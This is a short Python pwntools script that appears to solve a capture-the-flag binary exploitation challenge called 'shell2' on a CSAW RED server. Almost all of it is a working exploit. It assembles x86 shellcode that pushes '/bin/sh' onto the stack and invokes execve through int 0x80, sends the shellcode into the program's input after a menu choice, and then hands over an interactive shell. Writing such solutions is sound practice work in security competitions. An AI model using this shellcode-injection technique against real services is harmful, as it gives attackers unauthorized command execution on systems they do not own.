from pwn import *

e = ELF("./shell2")

context.binary = e.path

is_remote = "--remote" in sys.argv
def debug():
  if not is_remote:
    gdb.attach(p)

if is_remote:
  p = remote("pwn.red.csaw.io", 5009)
else:
  p = process(e.path)
  #, env={"LD_PRELOAD": libc.path})

pay = asm("""
  xor eax, eax
  push   0x68732f
  je $+0x0a
  mov ecx, esp
  mov ecx, esp
  mov ecx, esp
  mov ecx, esp

  push   0x6e69622f
  mov ebx, esp
  mov ecx, eax
  mov edx, eax
  mov al, 0xb
  int 0x80



""")

print(len(pay))

p.sendlineafter(">", "3")
debug()
p.sendlineafter(">", pay)


p.interactive()
